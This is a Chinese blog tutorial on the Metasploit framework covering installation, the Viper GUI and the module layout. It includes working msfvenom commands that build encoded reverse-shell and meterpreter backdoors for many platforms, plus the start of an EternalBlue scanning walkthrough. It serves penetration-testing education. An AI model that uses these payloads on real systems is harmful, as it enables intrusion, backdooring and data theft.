<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>MSF使用详解 - 编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="MSF使用详解" />
<meta property="og:description" content="MSF使用详解 01 MSF发展史02 Linux安装MS03 kali更新msf04 Windows安装MSF课件05 MSF图形界面Viper06 MSF目录结构07Metasploit的核心模块08-09msfvenom常用参数（更新）10-11 msfconsole漏洞利用流程12 meterpreter介绍13 PHP后门反弹连接演示文档14 后渗透之访问文件系统15 后渗透之上传下载文件16 后渗透之屏幕截图17 后渗透之键盘记录18 后渗透之创建账户（Windows）19 后渗透之调用音频设备录音20 后渗透之提权21 后渗透之获取登录密码（Windows）22 后渗透之远程监控（Windows）23 后渗透之调用摄像头 01 MSF发展史 1 Metasploit-发展史
Metasploit框架使Metasploit具有良好的可扩展性，它的控制接口负责发现漏洞、攻击漏洞，提交漏洞，然后通过一些接口加入攻击后处理工具和报表工具。Metasploit框架可以从一个漏洞扫描程序导入数据，使用关于有漏洞主机的详细信息来发现可攻击漏洞，然后使用有效载荷对系统发起攻击，有效载荷就是在发现漏洞之后开发一种可行的攻击方法。其用于提取本地系统密码、安装其他软件或控制硬件等的模块，这些功能很像以前BO2K等工具所具备的功能。
2004年
2004年8月，在拉斯维加斯开了一次世界黑客交流会–叫黑帽简报（Black Hat Briefings). 在这个会议上，一款叫Metasploit 的攻击和渗透工具备受众黑客关注，出尽了风头。 Metasploit 是同 HD Moore 和 Spoonm等4名年轻人开发的，这款免费软件可以帮助黑客攻击和控制计算机，安全人员也可以利用 Metasploit 来加强系统对此类工具的攻击。Metasploit 的演示吸引了来自“美国国防部”和“国家安全局”等政府机构的众多安全顾问和个人，正如 Spoonm 在演讲中所说的, Metasploit 很简单，只需要求“找到目标，单击和控制”即可。 2004年 Metasploit 的发布在安全界引发了强烈的“地震”。
2005年
2005年6月，西雅图效区的微软公司总部园区内的管理情报中心，开了一次“蓝帽”会议。几百名微软公司的工程师和众多外界专家及黑客都被邀请进入微软帝国的中心。在会议中的黑客攻击演示中，当 Moore 向系统程序员们说明使用 Metasploit 测试系统对抗入侵的可靠程度时，Metasploit 让微软公司的开发人员再次感到不安。在程序员们看来，Metasploit 将会使系统安全面临严重的考验。 Metasploit (MSF) 在2003年以开放源码方式发布，是可以自由获取的开发框架。它是一个强大的开源平台，提供开发，测试和使用恶意代码，这个环境为渗透测试，为shellcode 编写和漏洞研究提供了一个可靠平台。 Metasploit框架直到2006年发布的2.7版本都用Perl脚本语言编写，由于Perl的一些缺陷，开发者于2007年底使用Ruby语言重写了该框架。到2007年年底，Spoonm和马特·米勒已经离开了项目。从2008年发布的3.2版本开始，该项目采用新的3段式BSD许可证。
2009年
2009年10月21号，漏洞管理解决公司Rapid7收购Metasploit项目。Rapid7承诺成立专职开发团队，仍然将源代码置于3段式BSD许可证下。
2 BSD许可证
相较于GPL许可证和MPL许可证的严格性，BSD许可证就宽松许多了，一样是只需要附上许可证的原文，不过比较有趣的是，它还要求所有进一步开发者将自己的版权资料放上去，所以拿到以BSD许可证发行的软件可能会遇到一个小状况，就是这些版权资料许可证占的空间比程序还大。
3 Metasploit发展前景
02 Linux安装MS 1 乌班图安装MSF" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bcdabai.github.io/posts/7ab627628d5a9212e60e5983ae522872/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-10-19T16:42:54+08:00" />
<meta property="article:modified_time" content="2022-10-19T16:42:54+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">MSF使用详解</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p></p> 
<div class="toc"> 
 <h4>MSF使用详解</h4> 
 <ul><li><a href="#01_MSF_2" rel="nofollow">01 MSF发展史</a></li><li><a href="#02_LinuxMS_35" rel="nofollow">02 Linux安装MS</a></li><li><a href="#03_kalimsf_72" rel="nofollow">03 kali更新msf</a></li><li><a href="#04_WindowsMSF_135" rel="nofollow">04 Windows安装MSF课件</a></li><li><a href="#05_MSFViper_212" rel="nofollow">05 MSF图形界面Viper</a></li><li><a href="#06_MSF_305" rel="nofollow">06 MSF目录结构</a></li><li><a href="#07Metasploit_336" rel="nofollow">07Metasploit的核心模块</a></li><li><a href="#0809msfvenom_368" rel="nofollow">08-09msfvenom常用参数（更新）</a></li><li><a href="#1011_msfconsole_535" rel="nofollow">10-11 msfconsole漏洞利用流程</a></li><li><a href="#12_meterpreter_749" rel="nofollow">12 meterpreter介绍</a></li><li><a href="#13_PHP_904" rel="nofollow">13 PHP后门反弹连接演示文档</a></li><li><a href="#14__982" rel="nofollow">14 后渗透之访问文件系统</a></li><li><a href="#15__1015" rel="nofollow">15 后渗透之上传下载文件</a></li><li><a href="#16__1022" rel="nofollow">16 后渗透之屏幕截图</a></li><li><a href="#17__1028" rel="nofollow">17 后渗透之键盘记录</a></li><li><a href="#18_Windows_1036" rel="nofollow">18 后渗透之创建账户（Windows）</a></li><li><a href="#19__1065" rel="nofollow">19 后渗透之调用音频设备录音</a></li><li><a href="#20__1086" rel="nofollow">20 后渗透之提权</a></li><li><a href="#21_Windows_1133" rel="nofollow">21 后渗透之获取登录密码（Windows）</a></li><li><a href="#22_Windows_1222" rel="nofollow">22 后渗透之远程监控（Windows）</a></li><li><a href="#23__1275" rel="nofollow">23 后渗透之调用摄像头</a></li></ul> 
</div> 
<p></p> 
<h2><a id="01_MSF_2"></a>01 MSF发展史</h2> 
<p><strong>1 Metasploit-发展史</strong></p> 
<p><img src="https://images2.imgbox.com/48/ce/rclsrIGE_o.png" alt="image.png"></p> 
<p>Metasploit框架使Metasploit具有良好的可扩展性，它的控制接口负责发现漏洞、攻击漏洞，提交漏洞，然后通过一些接口加入攻击后处理工具和报表工具。Metasploit框架可以从一个漏洞扫描程序导入数据，使用关于有漏洞主机的详细信息来发现可攻击漏洞，然后使用有效载荷对系统发起攻击，有效载荷就是在发现漏洞之后开发一种可行的攻击方法。其用于提取本地系统密码、安装其他软件或控制硬件等的模块，这些功能很像以前BO2K等工具所具备的功能。</p> 
<p><strong>2004年</strong></p> 
<p>2004年8月，在拉斯维加斯开了一次世界黑客交流会–叫黑帽简报（Black Hat Briefings). 在这个会议上，一款叫Metasploit 的攻击和渗透工具备受众黑客关注，出尽了风头。 Metasploit 是同 HD Moore 和 Spoonm等4名年轻人开发的，这款免费软件可以帮助黑客攻击和控制计算机，安全人员也可以利用 Metasploit 来加强系统对此类工具的攻击。Metasploit 的演示吸引了来自“美国国防部”和“国家安全局”等政府机构的众多安全顾问和个人，正如 Spoonm 在演讲中所说的, Metasploit 很简单，只需要求“找到目标，单击和控制”即可。 2004年 Metasploit 的发布在安全界引发了强烈的“地震”。</p> 
<p><img src="https://images2.imgbox.com/eb/a9/36qlcoQE_o.png" alt="image.png"></p> 
<p><strong>2005年</strong></p> 
<p>2005年6月，西雅图效区的微软公司总部园区内的管理情报中心，开了一次“蓝帽”会议。几百名微软公司的工程师和众多外界专家及黑客都被邀请进入微软帝国的中心。在会议中的黑客攻击演示中，当 Moore 向系统程序员们说明使用 Metasploit 测试系统对抗入侵的可靠程度时，Metasploit 让微软公司的开发人员再次感到不安。在程序员们看来，Metasploit 将会使系统安全面临严重的考验。 Metasploit (MSF) 在2003年以开放源码方式发布，是可以自由获取的开发框架。它是一个强大的开源平台，提供开发，测试和使用恶意代码，这个环境为渗透测试，为shellcode 编写和漏洞研究提供了一个可靠平台。 Metasploit框架直到2006年发布的2.7版本都用Perl脚本语言编写，由于Perl的一些缺陷，开发者于2007年底使用Ruby语言重写了该框架。到2007年年底，Spoonm和马特·米勒已经离开了项目。从2008年发布的3.2版本开始，该项目采用新的3段式BSD许可证。</p> 
<p><strong>2009年</strong></p> 
<p>2009年10月21号，漏洞管理解决公司Rapid7收购Metasploit项目。Rapid7承诺成立专职开发团队，仍然将源代码置于3段式BSD许可证下。</p> 
<p><strong>2 BSD许可证</strong></p> 
<p>相较于GPL许可证和MPL许可证的严格性，BSD许可证就宽松许多了，一样是只需要附上许可证的原文，不过比较有趣的是，它还要求所有进一步开发者将自己的版权资料放上去，所以拿到以BSD许可证发行的软件可能会遇到一个小状况，就是这些版权资料许可证占的空间比程序还大。</p> 
<p><img src="https://images2.imgbox.com/f4/c5/geTIKvw7_o.png" alt="image.png"></p> 
<p><strong>3 Metasploit发展前景</strong></p> 
<p><img src="https://images2.imgbox.com/62/23/Ue1NdEmA_o.png" alt="image.png"></p> 
<h2><a id="02_LinuxMS_35"></a>02 Linux安装MS</h2> 
<p><strong>1 乌班图安装MSF</strong></p> 
<p><strong>环境准备：</strong></p> 
<p>vm虚拟机</p> 
<p>Ubuntu桌面版镜像</p> 
<p>打开终端 输入 sudo su 获取root权限</p> 
<p>然后输入命令</p> 
<p>curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall</p> 
<p>然后赋755权限 并执行安装</p> 
<p>chmod 755 msfinstall &amp;&amp; ./msfinstall</p> 
<p><strong>2 直接安装kali系统</strong></p> 
<p>第一种vm虚拟机 kali</p> 
<p>第二种 iso安装镜像</p> 
<p>首先咱们进入kali官网下载kali</p> 
<p><a href="https://www.kali.org/get-kali/#kali-bare-metal" rel="nofollow">https://www.kali.org/get-kali/#kali-bare-metal</a> 选择安装版镜像</p> 
<h2><a id="03_kalimsf_72"></a>03 kali更新msf</h2> 
<p>登录kali</p> 
<p><strong>1 打开终端获取root权限</strong></p> 
<pre><code>            获取root权限 可以在终端 输入 sudo su  然后输入登录密码获取root权限
</code></pre> 
<p><strong>2 开始更新</strong></p> 
<p>首先先添加更新源</p> 
<p>进入 etc/apt/ 目录</p> 
<p>打开 sources.list 需要使用root权限执行</p> 
<p><img src="https://images2.imgbox.com/05/67/3jGyqRYD_o.png" alt="image.png"></p> 
<p>deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</p> 
<p>deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</p> 
<p>#阿里云kali更新源</p> 
<p>deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</p> 
<p>deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</p> 
<p>#163 DEBIAN源</p> 
<p>deb http://mirrors.163.com/debian wheezy main non-free contrib</p> 
<p>deb-src http://mirrors.163.com/debian wheezy main non-free contrib deb http://mirrors.163.com/debian wheezy-proposed-updates main non-free contrib</p> 
<p>deb-src http://mirrors.163.com/debian wheezy-proposed-updates main non-free contrib</p> 
<p>deb-src http://mirrors.163.com/debian-security wheezy/updates main non-free contrib</p> 
<p><img src="https://images2.imgbox.com/04/27/4RyvO7H0_o.png" alt="image.png"></p> 
<p>​ apt-get update</p> 
<p>​ apt-get install metasploit-framework</p> 
<p><strong>3 如果更新时显示update无效的错误！</strong></p> 
<p><img src="https://images2.imgbox.com/32/cc/M22XDw5F_o.png" alt="image.png"></p> 
<p>输入下面几个命令修复</p> 
<p>wget -q -O - https://archive.kali.org/archive-key.asc | apt-key add</p> 
<p>apt-get clean</p> 
<p>apt-get update</p> 
<p><strong>4 如果报：</strong><br> E: Unmet dependencies. Try ‘apt --fix-broken install’ with no packages (or specify a solution).</p> 
<p>​ apt --fix-broken install</p> 
<h2><a id="04_WindowsMSF_135"></a>04 Windows安装MSF课件</h2> 
<p><strong>1 下载metasploit</strong></p> 
<p>首先咱们进入metasploit官网</p> 
<p><a href="https://www.metasploit.com/" rel="nofollow">https://www.metasploit.com/</a></p> 
<p><img src="https://images2.imgbox.com/2b/ff/dIlP7rCn_o.png" alt="image.png"></p> 
<p>点击 Download 下载</p> 
<p>或者直接访问这个 地址<br> <a href="https://www.metasploit.com/download" rel="nofollow"><br> https://www.metasploit.com/download</a></p> 
<p>进入这个页面 点击 Metasploit Framework 下面的 Download</p> 
<p><img src="https://images2.imgbox.com/7c/30/yQcQWenC_o.png" alt="image.png"></p> 
<p>会访问这个地址</p> 
<p><a href="https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers">https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers</a></p> 
<p>如果你不能打开GitHub 我们可以通过镜像服务器 访问<br> <a href="https://hub.fastgit.org/rapid7/metasploit-framework/wiki/Nightly-Installers" rel="nofollow"><br> https://hub.fastgit.org/rapid7/metasploit-framework/wiki/Nightly-Installers</a></p> 
<p><img src="https://images2.imgbox.com/74/85/IoIZoCFk_o.png" alt="image.png"></p> 
<p>这边给大家提供更多的国内可用镜像</p> 
<p>#官网镜像（可以用来clone push等,但是不能登录）</p> 
<p>https://github.com.cnpmjs.org/<br> https://git.sdut.me/</p> 
<p>#github常用的镜像</p> 
<p>https://hub.fastgit.org</p> 
<p>https://git.sdut.me/</p> 
<p>http://github-mirror.bugkiller.org/<br> #api镜像<br> https://api.git.sdut.me/</p> 
<p>然后找到Windows版本的下载</p> 
<p>点击 latest Windows installer 下载 最新版本</p> 
<p>点击 view older builds 下载历史版本</p> 
<p><img src="https://images2.imgbox.com/98/9b/tmdAGDE0_o.png" alt="image.png"></p> 
<p><strong>2 安装metasploit并配置环境变量</strong></p> 
<p>安装前关闭win自带的杀毒 和卸载第三方杀毒</p> 
<p>添加环境变量</p> 
<p>C:\metasploit-framework\bin</p> 
<p><strong>3 启动并使用</strong></p> 
<p>首次启动 需要初始化数据库</p> 
<p>终端中输入 msfdb init</p> 
<p>启动MSF框架</p> 
<p>终端中输入 msfconsole</p> 
<h2><a id="05_MSFViper_212"></a>05 MSF图形界面Viper</h2> 
<p><strong>MSF图形化界面Viper(炫彩蛇)下载与使用</strong></p> 
<p>Viper是一款图形化内网渗透工具,将内网渗透过程中常用的战术及技术进行模块化及武器化.</p> 
<p>集成杀软绕过,内网隧道,文件管理,命令行等基础功能.</p> 
<p>当前已集成70+个模块,覆盖初始访问/持久化/权限提升/防御绕过/凭证访问/信息收集/横向移动等大类.</p> 
<p><strong>在Kali Linux上安装Docker</strong></p> 
<p>apt-get update</p> 
<p>#使用apt安装docker</p> 
<p>apt-get install -y docker.io</p> 
<p>#设置开机启动 systemctl start docker</p> 
<p>#检查启动状态 docker version</p> 
<p><strong>安装docker-compose</strong></p> 
<p>curl -L https://get.daocloud.io/docker/compose/releases/download/1.25.5/docker-compose-<code>uname -s</code>-<code>uname -m</code> &gt; /usr/bin/docker-compose</p> 
<p>#给赋可执行状态 chmod +x /usr/bin/docker-compose</p> 
<p>#设置安装目录</p> 
<p>export VIPER_DIR=/root/VIPER</p> 
<p>#执行如下命名生成安装目录,并进入安装目录</p> 
<p>mkdir -p $VIPER_DIR &amp;&amp; cd $VIPER_DIR</p> 
<p><strong>执行如下命令生成docker-compose.yml</strong></p> 
<p>如果你看到的命令是乱的 https://note.youdao.com/s/GdzSJnWD 看这个文档</p> 
<p>tee docker-compose.yml &lt;&lt;-‘EOF’ version: “3” services: viper: image: registry.cn-shenzhen.aliyuncs.com/toys/viper:latest container_name: viper-c network_mode: “host” restart: always volumes: - ${PWD}/loot:/root/.msf4/loot - ${PWD}/db:/root/viper/Docker/db - ${PWD}/module:/root/viper/Docker/module - ${PWD}/log:/root/viper/Docker/log - ${PWD}/nginxconfig:/root/viper/Docker/nginxconfig command: [“VIPER_PASSWORD”] EOF</p> 
<p><strong>设置登录密码</strong></p> 
<p>Viper不允许使用默认密码,diypassword替换为自定义密码密码</p> 
<p>export VIPER_PASSWORD=输入你的密码</p> 
<p><strong>写入密码到docker-compose.yml</strong></p> 
<p>sed -i “s/VIPER_PASSWORD/$VIPER_PASSWORD/g” docker-compose.yml</p> 
<p>#使用命令查看一下配置</p> 
<p>cat docker-compose.yml</p> 
<p><strong>创建启动Viper</strong></p> 
<p>cd $VIPER_DIR docker-compose up -d</p> 
<p>启动viper</p> 
<p>docker-compose start</p> 
<p><strong>等待15s系统启动,访问</strong></p> 
<ul><li><strong>https://ip:60000</strong></li><li>登录. 用户名:root 密码: 自定义密码</li></ul> 
<p>在终端内输入 ip a 查看本机ip</p> 
<ul><li><strong>我的IP是192.168.3.31 那么我在浏览器里就访问 https://192.168.3.31:60000 登录名是 root 密码是 我上面设置的root</strong></li></ul> 
<p>例如： 我的ip是 192.168.3.31 那么访问炫彩蛇的IP就是 192.168.3.31:60000</p> 
<p><strong>注意：</strong></p> 
<p><strong>所有的docker-compose命令必须在安装目录执行才会有效果</strong></p> 
<h2><a id="06_MSF_305"></a>06 MSF目录结构</h2> 
<p>kali终端中输</p> 
<p>/usr/share/metasploit-framework</p> 
<p>然后输入 ls 查看</p> 
<p><img src="https://images2.imgbox.com/a8/99/SEuVJWNv_o.png" alt="image.png"></p> 
<p><img src="https://images2.imgbox.com/09/e5/L7KfwHrB_o.png" alt="image.png"></p> 
<p><img src="https://images2.imgbox.com/a5/f5/3cuPb2zL_o.png" alt="image.png"></p> 
<p><strong>要记住的一些模块</strong></p> 
<p>modules：目录里面存放渗透使用的 辅助模块 编码模块 利用模块 攻击载荷 后渗透模块</p> 
<p>plugins： 这个模块需要用load加载，主要提供数据库连接插件 和 各种要用到的插件。</p> 
<p>tools：包含一些有用的脚本和零散的工具。</p> 
<p>scripts：目录里面存放都是meterpreter利用的脚本。</p> 
<p>db：数据放在这个目录里</p> 
<p>data：存放使用到的文件，比如密码字典、meterpreter、passivex、vnc、dlls等工具和一些用户接口代码，msfweb和一些其他模块用到的数据文件</p> 
<p>lib：库文件都保存在这个目录里</p> 
<h2><a id="07Metasploit_336"></a>07Metasploit的核心模块</h2> 
<p>msf的模块都放在</p> 
<p>/usr/share/metasploit-framework/modules/这个目录下</p> 
<p><img src="https://images2.imgbox.com/e4/c6/H3zClJnA_o.png" alt="image.png"></p> 
<p>1 auxiliary:辅助模块，辅助渗透(端口扫描、登录密码爆破、漏洞验证等)</p> 
<p>2 exploits:漏洞利用模块，包含主流的漏洞利用脚本，通常是对某些可能存在漏洞的目标进行漏洞利用。</p> 
<p>3 payloads:攻击载荷，主要是攻击成功后在目标机器执行的代码,比如反弹shell的代码</p> 
<p>4 post:后渗透阶段模块，漏洞利用成功获得meterpreter之后， 向目标发送的一些功能性</p> 
<p>指令,如:提权等</p> 
<p>5 encoders: 编码器模块，主要包含各种编码工具，对payload进行编码加密，以便绕过入侵检测和过滤系统</p> 
<p>6 evasion:躲避模块，用来生成免杀payload</p> 
<p>7 nops:这里主要放着调整shellcode 前置nop指令长度的工具（不理解没关系）</p> 
<p>Kali中的 msfvenom 取代了msfpayload和msfencode，常用于生成后门木马</p> 
<p>msfpayload是MSF攻击荷载生成器，用于生成shellcode和可执行代码。<br> msfencode是MSF编码器。</p> 
<hr> 
<h2><a id="0809msfvenom_368"></a>08-09msfvenom常用参数（更新）</h2> 
<p><strong>一 、msfvenom 常用参数</strong></p> 
<p>-l<br> 列出指定模块的所有可用资源,模块类型包括: payloads, encoders, nops, all</p> 
<p>-p<br> 指定需要使用的payload(攻击荷载)。</p> 
<p>-f<br> 指定输出格式</p> 
<p>Executable formats:Asp、aspx、aspx-exe、axis2、dll、elf、elf-so、exe、exe-only、exe-service、exe-smallhta-psh、jar、jsp、loop-vbs、macho、msi、msi-nouac、osx-app、psh、psh-cmd、psh-net、psh-reflection、python-reflection、vba、vba-exe、vba-psh、vbs、war；</p> 
<p>Transform formats:base32、base64、bash、c、csharp、dw、dword、hex、java、js_be、js_le、num、perl、pl、powershell、ps1、py、python、raw、rb、ruby、sh、vbapplication、vbscript；</p> 
<p>-e<br> 指定需要使用的encoder（编码器）编码免杀。</p> 
<p>-a<br> 指定payload的目标架构</p> 
<p>选择架构平台:x86 | x64 | x86_64<br> Platforms:windows, netware, android, java, ruby, linux, cisco, solaris, osx, bsd, openbsd, bsdi, netbsd, freebsd, aix, hpux, irix, unix, php, javascript, python, nodejs, firefox, mainframe</p> 
<p>-o<br> 保存payload文件输出。</p> 
<p>-b<br> 设定规避字符集，比如: '\x00\xff’避免使用的字符</p> 
<p>-n<br> 为payload预先指定一个NOP滑动长度</p> 
<p>-s<br> 设定有效攻击荷载的最大长度生成payload的最大长度，就是文件大小。</p> 
<p>-i<br> 指定payload的编码次数</p> 
<p>-c<br> 指定一个附加的win32 shellcode文件</p> 
<p>-x<br> 指定一个自定义的可执行文件作为模板<br> 例如：原先有个正常文件normal.exe 可以通过这个选项把后门捆绑到这个程序上面。</p> 
<p>-k<br> 保护模板程序的动作，注入的payload作为一个新的进程运行<br> 例如：原先有个正常文件normal.exe 可以通过这个选项把后门捆绑到这个程序上面。</p> 
<p>-v<br> 指定一个自定义的变量，以确定输出格式</p> 
<hr> 
<p><strong>二、各平台生成payload命令</strong></p> 
<hr> 
<p>Windows</p> 
<p>msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.3.33 LPORT=4444 -e x86/shikata_ga_nai -b ‘\x00\x0a\xff’ -i 10 -f exe -o payload.exe</p> 
<hr> 
<p>Mac</p> 
<p>msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=192.168.3.33 LPORT=4444 -f macho -o payload.macho</p> 
<hr> 
<p>Android</p> 
<p>msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4567 -o payload.apk</p> 
<hr> 
<p>Powershell</p> 
<p>msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=192.168.1.1 LPORT=8888 -e cmd/powershell_base64 -i 3 -f raw -o payload.ps1</p> 
<hr> 
<p>Linux</p> 
<p>msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4567 -f elf -o payload.elf</p> 
<hr> 
<p>php</p> 
<p>msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=8888 -f raw &gt; shell.php</p> 
<hr> 
<p>aspx</p> 
<p>msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=8888 -f aspx -o payload.aspx</p> 
<hr> 
<p>JSP</p> 
<p>msfvenom --platform java -p java/jsp_shell_reverse_tcp LHOST=192.168.1.1 LPORT=4567 -f raw -o payload.jsp</p> 
<hr> 
<p>war</p> 
<p>msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.1 LPORT=4567 -f raw - o payload.war</p> 
<hr> 
<p>nodejs</p> 
<p>msfvenom -p nodejs/shell_reverse_tcp LHOST=192.168.1.1 LPORT=4567 -f raw -o payload.js</p> 
<hr> 
<p>python</p> 
<p>msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4567 -f raw -o payload.py</p> 
<hr> 
<p>perl</p> 
<p>msfvenom -p cmd/unix/reverse_perl LHOST=192.168.1.1 LPORT=4567 -f raw -o payload.pl</p> 
<hr> 
<p>ruby</p> 
<p>msfvenom -p ruby/shell_reverse_tcp LHOST=192.168.1.1 LPORT=4567 -f raw -o payload.rb</p> 
<hr> 
<p>lua</p> 
<p>msfvenom -p cmd/unix/reverse_lua LHOST=192.168.1.1 LPORT=4567 -f raw -o payload.lua</p> 
<hr> 
<p>windows shellcode</p> 
<p>msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4567 -f c</p> 
<hr> 
<p>linux shellcode</p> 
<p>msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4567 -f c</p> 
<hr> 
<p>mac shellcode</p> 
<p>msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=192.168.1.1 LPORT=4567 -f c</p> 
<hr> 
<h2><a id="1011_msfconsole_535"></a>10-11 msfconsole漏洞利用流程</h2> 
<p><strong>一、阶段划分：</strong></p> 
<p>漏洞利用分为 前期交互 情报搜集 威胁建模 漏洞分析 .渗透利用 后渗透利用 报告 这几个阶段</p> 
<p><strong>1.前期交互阶段：</strong></p> 
<p>与客户组织进行交互讨论，确定范围，目标等</p> 
<p>​ 这个阶段大家可以理解为情报收集前阶段，主要是为了找到目标 确认范围</p> 
<p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-pFAfZr8y-1666167673706)(10-11 msfconsole漏洞利用流程.assets/1643165117094.png)]</p> 
<p><strong>2.情报搜集阶段：</strong></p> 
<p>获取更多目标组织信息，</p> 
<p>| 外围信息搜索 - Google</p> 
<p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-GWPRHdwP-1666167673707)(10-11 msfconsole漏洞利用流程.assets/1643165139006.png)]</p> 
<p>​ 主机探测与端口扫描 如 -Nmap</p> 
<p>​ 服务扫描 利用metasploit中的auxiliary/scanner/中的服务扫描模块，可以对靶机中的服务版本等信息进行扫描</p> 
<p>​ 网络漏洞扫描 -OpenVAS、Nessus等</p> 
<p>​ 其他工具扫描 py脚本扫描</p> 
<p><strong>3.威胁建模阶段：</strong></p> 
<p>理清头绪，确定出最可行的漏洞利用通道，这个建模阶段写的文档不是给自己看的 是给整个团队看的 方便多人合作</p> 
<p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-vViQWSs2-1666167673707)(10-11 msfconsole漏洞利用流程.assets/1643165166875.png)]</p> 
<p>​ 这个阶段主要是根据收集到的情报进行整理 ，理清漏洞利用思路。</p> 
<p><strong>4.漏洞分析阶段：</strong></p> 
<p>搜索可获取的渗透代码资源</p> 
<p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-CFjTB6YY-1666167673707)(10-11 msfconsole漏洞利用流程.assets/1643165182827.png)]</p> 
<p>​ 这个阶段主要 挑选匹配可能存在的漏洞利用模块，shellcode</p> 
<p><strong>5.渗透利用阶段：</strong></p> 
<p>找出安全漏洞，入侵系统</p> 
<p>​ 这个阶段尝试利用漏洞 ，配置监控，开始漏洞利用</p> 
<p><strong>6.后渗透利用阶段：</strong></p> 
<p>Meterpreter，实施操作</p> 
<p>​ 这个阶段 就开始实施相关数据下载 后门维持 提权等操作</p> 
<p><strong>7.报告阶段：</strong></p> 
<p>漏洞利用渗透测试报告 （详细报告编写看 渗透测试报告课程）</p> 
<p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-qvh0t4qD-1666167673707)(10-11 msfconsole漏洞利用流程.assets/1643165204135.png)]</p> 
<p>| 这个阶段主要是对本次渗透进行总结，概述总体上包括 时间、人员、漏洞利用范围、技术手段等等。我们需要在这部分确定漏洞利用执行的时间范围、参与漏洞利用的人员及联系方式、约定的漏洞利用范围和一些漏洞利用过程中采用的技术、工具描述。写清 前期交互 情报搜集 威胁建模 漏洞分析 .渗透利用 后渗透利用 漏洞利用结果 安全建议 等内容</p> 
<p>在撰写的过程中，需要特别注意的是：漏洞描述切忌不可过于简单，一笔带过；在安全建议部分避免提出没有实际意义的安全建议，比如加强安全意识；报告结构混乱不堪，太多复杂的专业术语，比如绕狗、x站等等；</p> 
<p><strong>二、实际操作（举例）</strong></p> 
<p>主机范围和目标已确定</p> 
<p><strong>1 情报搜集</strong></p> 
<p>基于msf发现内网存活主机</p> 
<p>search 搜索</p> 
<p>msf终端内输入 search scanner type:auxiliary</p> 
<p>可用于发现主机的模块</p> 
<p>auxiliary/scanner/discovery/arp_sweep # 基于ARP发现内网存活主机</p> 
<p>auxiliary/scanner/discovery/udp_sweep # 基于UDP发现内网存活主机</p> 
<p>auxiliary/scanner/ftp/ftp_version # 发现FTP服务</p> 
<p>auxiliary/scanner/http/http_version # 发现HTTP服务</p> 
<p>auxiliary/scanner/smb/smb_version # 基于smb发现内网存活主机</p> 
<p>基于netbios发现内网存活主机</p> 
<p>基于snmap发现内网存活主机</p> 
<p>基于ICMP发现内网存活主机</p> 
<p><strong>2 威胁建模</strong></p> 
<hr> 
<p>经过第一步情报收集 我们通过arp发现了 目标机器ip</p> 
<p>然后通过对目标机器的ip扫描 我们知道了 目标机器开通了 80端口 有web服务 开了ftp端口 有文件服务</p> 
<p>开了 smb</p> 
<p>最终决定对smb相关的漏洞进行利用</p> 
<p>备选方案通过植入木马的方式进行利用</p> 
<hr> 
<p><strong>3 漏洞分析</strong></p> 
<p>第一步先查看smb利用漏洞有哪些 比如永恒之蓝</p> 
<p>1 查询msf与永恒之蓝相关的 模块</p> 
<p>使用命令 search ms17_010</p> 
<p>2 然后我们利用了一个永恒之蓝的 扫描模块</p> 
<p>use auxiliary/scanner/smb/smb_ms17_010</p> 
<p>3 输入 options 查看扫描模块需要配置的参数</p> 
<p>3.1 然后我们配置了rhost （rhost指的是目标主机ip）</p> 
<p>set rhost ip</p> 
